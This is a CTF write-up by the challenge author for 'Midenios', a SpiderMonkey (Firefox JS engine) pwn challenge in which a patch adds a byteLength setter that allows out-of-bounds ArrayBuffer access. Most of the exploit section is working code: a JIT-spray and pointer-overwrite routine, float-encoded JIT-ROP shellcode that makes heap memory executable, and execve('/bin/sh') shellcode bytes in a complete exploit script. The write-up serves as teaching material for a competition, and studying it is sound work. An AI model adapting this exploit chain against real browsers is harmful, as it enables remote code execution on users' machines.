---
title: "Midenios - HTB Business CTF 2022: Dirty Money"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["javascript", "pwn", "firefox", "v8", "spidermonkey", "rop", "midenios", "xor", "heap", "shellcode", "eval", "os-system", "htb-business-ctf-2022-dirty-mo", "htb-business-ctf-2022-dirty-money", "2022", "ctf-writeup"]
summary: "This is a SpiderMonkey pwn challenge that I wrote for the 2022 HTB Business CTF."
source:
  name: "CTFtime writeup #39397"
  url: "https://ctftime.org/writeup/39397"
original_source: "https://xz.ax/midenios/"
ctf:
  name: "HTB Business CTF 2022: Dirty Money"
  year: 2022
  challenge: "Midenios"
---

## Metadata

- **CTF:** HTB Business CTF 2022: Dirty Money
- **Task:** Midenios
- **Author team:** Crusaders of Rust
- **CTFtime tags:** javascript, pwn, firefox, v8, spidermonkey, rop, midenios
- **CTFtime:** <https://ctftime.org/writeup/39397>
- **Original writeup:** <https://xz.ax/midenios/>

---
# Midenios

This is a SpiderMonkey pwn challenge that I wrote for the 2022 HTB Business CTF. It was my first time writing a SpiderMonkey exploit, so is fairly straightforward.

#### Description

|  The Government have obtained intelligence suggesting that Midenios have been selling zero-days to North Korea, and suspect the organisation's ringleaders live in NATO-cooperative countries. Unfortunately, Midenios use Tor Browser to communicate with potential customers, so an IP logger would be ineffective. Whilst not as notorious as V8, Tor Browser's JS engine is actually less hardened than its competitor, and bugs as simple as relative ArrayBuffer OOBs can be catastrophic. Can you find a way to gain RCE and identify bad actors?  
---|---  
  
#### Difficulty

| 

```
    hard
```  
  
#### Flag

| 

```
    HTB{c0ry_d0ctorow_was_wr0ng}
```  
  
#### Release

| [midenios-dist.tar.gz](https://xz.ax/midenios/midenios-dist.tar.gz)  
  
In this challenge, competitors are presented with a server which executes JavaScript code provided to it. The code is put in a directory with an `exploit.html` file including it, and then opened with a headless non-sandboxed Firefox instance. 

Here's the script that users interact with: 

```
    			#!/usr/bin/env python3
    
                import os
                import sys
                import tempfile
    
                print("Enter a javascript followed by EOF: ")
                buf = ""
                while "EOF" not in buf:
                    buf += input() + "\n"
    
                with tempfile.TemporaryDirectory() as dir:
                    os.chdir(dir)
                    with open("exploit.html", 'w') as f:
                        f.write("<script src='exploit.js'></script>")
                    with open("exploit.js", 'w') as f:
                        f.write(buf[:-3])
                    os.environ["MOZ_DISABLE_CONTENT_SANDBOX"] = "1"
                    os.system(f"timeout 20s /tmp/firefox/firefox exploit.html --headless")
```

The objective of this challenge was to craft a java-script payload that, when executed, gave the attacker a shell on the machine running this server. 

* * *

There are two files we're interested in:

  * src/diff.patch, which contains a modification to the mainline Firefox source
  * [src/firefox.rar](https://xz.ax/midenios/challenge-files/src/firefox.rar), which contains a Firefox binary compiled from Firefox mainline with _diff.patch_ applied. This is the binary that the server uses to open exploit.html. 


### The Bug

Understanding the vulnerability introduced by this patch requires knowing how the JS `ArrayBuffer` object works. You should read [the documentation provided by MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer) for general background on the datastructure, but the key thing here is that **unlike`Array`, `ArrayBuffer` is fixed-size**. 

To facilitate this, `ArrayBuffer` has a read-only property called `byteLength` which is determined when the object is constructed. Usually, writing to the `byteLength` property has no effect: 

```
    const buffer = new ArrayBuffer(8)
    print(buffer.byteLength) // -> 8
    buffer.byteLength = 16
    print(buffer.byteLength) // -> 8
```

The patch above introduces a 'setter' for this property, which is the (previously-undefined) function called when the `byteLength` property is written to. The setter does some argument validation, before calling `buffer->setByteLength(targetLength)`, where `targetLength` is an integral value on the right hand side of the assignment. **This is unsafe** ; the `byteLength` property, and thus the width of the underlying buffer Java script programs can read/write to, can be modified beyond the length of the originally allocated buffer. 

```
    const buffer = new ArrayBuffer(8)
    const length1 = buffer.byteLength // 8
    buffer.byteLength = 16 // update length
    const view = new BigUint64Array(buffer) // ABs can't be indexed directly;  a view is required
    view[1] // out-of-bounds read
```

### diff.patch

```
     diff --git a/js/src/vm/ArrayBufferObject.cpp b/js/src/vm/ArrayBufferObject.cpp
     --- a/js/src/vm/ArrayBufferObject.cpp
     +++ b/js/src/vm/ArrayBufferObject.cpp
     @@ -336,7 +336,7 @@ static const JSFunctionSpec arraybuffer_
    	  JS_SELF_HOSTED_FN("slice", "ArrayBufferSlice", 2, 0), JS_FS_END};
    
      static const JSPropertySpec arraybuffer_proto_properties[] = {
     -    JS_PSG("byteLength", ArrayBufferObject::byteLengthGetter, 0),
     +    JS_PSGS("byteLength", ArrayBufferObject::byteLengthGetter, ArrayBufferObject::byteLengthSetter, 0),
    	  JS_STRING_SYM_PS(toStringTag, "ArrayBuffer", JSPROP_READONLY), JS_PS_END};
    
      static const ClassSpec ArrayBufferObjectClassSpec = {
     @@ -377,12 +377,50 @@ MOZ_ALWAYS_INLINE bool ArrayBufferObject
    	return true;
      }
    
     +MOZ_ALWAYS_INLINE bool ArrayBufferObject::byteLengthSetterImpl(
     +    JSContext* cx, const CallArgs& args) {
     +  MOZ_ASSERT(IsArrayBuffer(args.thisv()));
     +
     +  // Steps 1-2
     +  auto* buffer = &args.thisv().toObject().as<ArrayBufferObject>();
     +  if (buffer->isDetached()) {
     +    JS_ReportErrorNumberASCII(cx, GetErrorMessage, nullptr,
     +                              JSMSG_TYPED_ARRAY_DETACHED);
     +    return false;
     +  }
     +
     +  // Step 3
     +  double targetLength;
     +  if (!ToInteger(cx, args.get(0), &targetLength)) {
     +    return false;
     +  }
     +
     +  if (buffer->isDetached()) { // Could have been detached during argument processing
     +    JS_ReportErrorNumberASCII(cx, GetErrorMessage, nullptr,
     +                              JSMSG_TYPED_ARRAY_DETACHED);
     +    return false;
     +  }
     +
     +  // Step 4
     +  buffer->setByteLength(targetLength);
     +
     +  args.rval().setUndefined();
     +  return true;
     +}
     +
      bool ArrayBufferObject::byteLengthGetter(JSContext* cx, unsigned argc,
    										   Value* vp) {
    	CallArgs args = CallArgsFromVp(argc, vp);
    	return CallNonGenericMethod<IsArrayBuffer, byteLengthGetterImpl>(cx, args);
      }
    
     +bool ArrayBufferObject::byteLengthSetter(JSContext* cx, unsigned argc,
     +                                         Value* vp) {
     +  CallArgs args = CallArgsFromVp(argc, vp);
     +  return CallNonGenericMethod<IsArrayBuffer, byteLengthSetterImpl>(cx, args);
     +}
     +
     +
      /*
       * ArrayBuffer.isView(obj); ES6 (Dec 2013 draft) 24.1.3.1
       */
     @@ -1000,7 +1038,7 @@ inline size_t ArrayBufferObject::associa
      }
    
      void ArrayBufferObject::setByteLength(size_t length) {
     -  MOZ_ASSERT(length <= maxBufferByteLength());
     +//  MOZ_ASSERT(length <= maxBufferByteLength());
    	setFixedSlot(BYTE_LENGTH_SLOT, PrivateValue(length));
      }
    
     diff --git a/js/src/vm/ArrayBufferObject.h b/js/src/vm/ArrayBufferObject.h
     --- a/js/src/vm/ArrayBufferObject.h
     +++ b/js/src/vm/ArrayBufferObject.h
     @@ -166,6 +166,7 @@ using MutableHandleArrayBufferObjectMayb
       */
      class ArrayBufferObject : public ArrayBufferObjectMaybeShared {
    	static bool byteLengthGetterImpl(JSContext* cx, const CallArgs& args);
     +  static bool byteLengthSetterImpl(JSContext* cx, const CallArgs& args);
    
       public:
    	static const uint8_t DATA_SLOT = 0;
     @@ -337,6 +338,7 @@ class ArrayBufferObject : public ArrayBu
    	static const JSClass protoClass_;
    
    	static bool byteLengthGetter(JSContext* cx, unsigned argc, Value* vp);
     +  static bool byteLengthSetter(JSContext* cx, unsigned argc, Value* vp);
    
    	static bool fun_isView(JSContext* cx, unsigned argc, Value* vp);
```

### Exploit

An attacker can craft a JIT payload using the [JIT-ROP technique](https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#force-the-jit-of-arbitrary-gadgets-bring-your-own-gadgets), and then spray compiled copies of this function to the heap using `eval`:

```
    function compile() {
    	let payload = eval(`() => {
    		const a = 1.5988992536819819e-270;
    	    const b = 1.5995906889567309e-270;
    	    const c =   1.597122538591395e-270;
    	    const d = 2.4687513098123557e-275;
    	    const e = 2.439451346390307e-275;
    	    const f = -9.034974592533198e+192;
    	};`)
    
    	for(let i = 0; i != 100; i++) payload();
    	return payload;
    }
    
    let m = [];
    for(let i = 0; i != 100; i++) m.push(compile());
```

This will fill the heap after our arraybuffer with JIT metadata structs, which contain a pointer into the section of code containing our compiled payload. Spraying like this isn't technically necessary, but improves reliability by increasing the jit metadata/useless crap ratio in the heap. We then can search for a JIT pointer, and increase it by 0x44a such that it points into the middle of our first inlined float load instruction: 

```
    let JIT_PAGE_START = undefined;
    for (let i = 0; i < 10; i++) {
        let value = writer[(0x34c8) / 8 + i];
        if (value < 0xfff8800000000000 && value != 13600000000n && value > 0xffffff) { // some filtering to make sure we get the right value
            JIT_PAGE_START = value;
            break
        }
    }
    
    
    if (JIT_PAGE_START == undefined || JIT_PAGE_START == 0n) window.location.reload();
    console.log(`[-] jit functin address:  ${JIT_PAGE_START.toString(16)}`)
    const PAYLOAD = JIT_PAGE_START + 0x44an
    const JIT_BASE = (JIT_PAGE_START >> 8n) << 8n
    
    for (let i = 0; i < 0x3000; i++) {
    
        let value = writer[i + 1]
    
        if ((value & JIT_BASE) == JIT_BASE) { // overwrite suspected jit pointers (most of them are to sprayed functions)
    
            writer[i + 1] = JIT_PAGE_START + 0x44an;
        }
    }
```

We can then iterate over all of our sprayed functions, which will eventually hit an overwritten pointer, and jump to our float shellcode:

```
    for(const a of m) a();
```

Rather than trying to include all of my shellcode into 6 6-byte instructions, I noticed that a pointer to the start of the heap was located in $R9 when the payload function was called. I wrote shellcode that would mprotect 0x25000 bytes after $R9 to be RWX, and then search for & jump to shellcode stored in the heap. This probably wasn't worth it in retrospect, but was more fun to write.

I marked the start of the shellcode with 0x6eadeef, and then used `repne scansq` to search for the shellcode in the heap. I probably should have made a separate buffer, but overwriting stuff to make room for my shellcode using the out-of-bounds buffer seemed to work fine. Here's the final shellcode used to make the floats:

```
    xor eax, eax
    mov edx, eax
    mov dl, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
    jmp $+9
    
    mov rdi,r9 ; void* addr
    mov al, 10 ; mprotect syscall
    jmp $+9
    
    mov esi, 0x25000 ; size_t length
    jmp $+9
    
    syscall
    jmp $+9
    
    mov eax, 0x6eadeef ; egg
    jmp $+9
    repne scasq ; scan through [RDI] to find [RAX]
    repne scasq ; do it again, since the first hit is some weird cache thing
    jmp rdi ; jump
```

And here's the final exploit:

```
    if (window)
    	print = console.log
    //if (!readline)
    readline = () => {}
    
    let buf = new ArrayBuffer(8);
    buf.byteLength = 0x3005 * 8;
    let ui = new Uint8Array(buf)
    let writer = new BigUint64Array(buf);
    
    console.log("[-] Spraying jit heap")
    
    function compile() {
    	let payload = eval(`() => {
    const a = 1.5988992536819819e-270;
    	const b = 1.5995906889567309e-270;
      const c =   1.597122538591395e-270;
    	const d = 2.4687513098123557e-275;
    	const e = 2.439451346390307e-275;
    	const f = -9.034974592533198e+192;
     const g = 1.6506203494991563e-270;
    
    };`)
    
    	for (let i = 0; i < 100; i++) payload();
    	return payload;
    }
    let m = []
    for (let i = 0; i < 100; i++) m.push(compile());
    
    
    let JIT_FUNCTION_START = undefined;
    for (let i = 0; i < 10; i++) {
    	let value = writer[(0x34c8) / 8 + i];
    	if (value < 0xfff8800000000000 && value != 13600000000n && value > 0xffffff) {
    		JIT_FUNCTION_START = value;
    		break
    	}
    
    }
    
    
    if (JIT_FUNCTION_START == undefined || JIT_FUNCTION_START == 0n)
    	window.location.reload();
    
    console.log(`[-] jit functin address:  ${JIT_FUNCTION_START.toString(16)}`)
    const JIT_BASE = (JIT_FUNCTION_START >> 8n) << 8n
    
    for (let i = 0; i < 0x3000; i++) {
    	let value = writer[i]
    
    	if ((value & JIT_BASE) == JIT_BASE) {
    		writer[i] = JIT_FUNCTION_START + 0x44an;
    	}
    }
    
    new BigUint64Array(buf)[6] = 0x6eadeefn // there's some important stuff right after the arraybuffer that sometimes pisses the GC off before we have a chance to hit the payload
    new Uint8Array(buf).set([0x48, 0x31, 0xF6, 0x56, 0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x2F, 0x73, 0x68, 0x57, 0x54, 0x5F, 0x6A, 0x3B, 0x58, 0x99, 0x0F, 0x05], 7 * 8) // /bin/sh
    console.log("shellcode written")
    buf.byteLength = 8 // also to make the gc less angry
    for (const a of m) a();
    //EOF
```
